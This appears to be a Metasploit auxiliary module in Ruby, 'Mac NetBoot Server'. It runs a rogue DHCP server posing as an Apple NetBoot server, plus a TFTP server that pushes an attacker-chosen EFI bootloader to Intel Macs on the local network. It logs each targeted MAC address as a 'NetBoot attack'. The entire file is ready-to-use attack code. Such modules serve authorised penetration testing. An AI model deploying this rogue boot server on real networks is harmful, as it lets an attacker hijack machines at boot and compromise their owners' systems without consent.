require 'msf/core'
require 'rex/proto/tftp'
require 'rex/proto/dhcp'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TFTPServer
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Mac NetBoot Server',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module provides a NetBoot server for network booting of Intel-based Macs.
				It does this by providing a specially-configured DHCP server to configure the
				target's network stack and a TFTP server to serve an EFI bootloader.

				Based on the `pxexploit' module by scriptjunkie. 
			},
			'Author'      => [ 'snare' ],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' =>
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		)

		register_options(
			[
				OptString.new('TFTPROOT',	[false, 'The TFTP root directory from which to serve files', '/tftp']),
				OptString.new('SRVHOST',	[true,	'The IP of the DHCP server']),
				OptString.new('SRVNAME',	[false, 'The hostname of the DHCP server']),
				OptString.new('FILENAME',	[true,	'The filename of the bootloader', 'boot.efi']),
				OptString.new('ROOTPATH',	[false, 'The path to the root filesystem image']),
				OptString.new('NETMASK',	[false, 'The netmask of the local subnet', '255.255.255.0']),
				OptString.new('DHCPIPSTART',[false, 'The first IP to give out']),
				OptString.new('DHCPIPEND',	[false, 'The last IP to give out']),
			], self.class)
	end

	def run
		if not datastore['TFTPROOT']
			datastore['TFTPROOT'] = File.join(Msf::Config.data_directory, 'auxiliary', 'netboot')
		end
		datastore['SERVEONCE'] = true

		print_status("Starting TFTP server...")
		@tftp = Rex::Proto::TFTP::Server.new
		@tftp.set_tftproot(datastore['TFTPROOT'])
		@tftp.start

		print_status("Starting DHCP server...")
		@dhcp = Rex::Proto::DHCP::Server.new( datastore )

		# Set vendor options to identify as a NetBoot server. Only supports Intel Macs, but could
		# be extended to support PPC without too much effort (I don't have one handy to test on).
		# See http://www.afp548.com/article.php?story=20061220102102611 for more info
		@dhcp.vendor_class_id = "AAPLBSDPC/i386"
		@dhcp.vendor_encap_opts = "\x08\x04\x81\x00\x00\x67"
		@dhcp.root_path = datastore['ROOTPATH']

		@dhcp.report do |mac, ip|
			print_status("Serving NetBoot attack to #{mac.unpack('H2H2H2H2H2H2').join(':')} "+
					"(#{Rex::Socket.addr_ntoa(ip)})")
			report_note(
				:type => 'NetBoot.client',
				:data => mac.unpack('H2H2H2H2H2H2').join(':')
			)
		end
		@dhcp.start

		# Wait for finish..
		@tftp.thread.join
		@dhcp.thread.join

	end

end

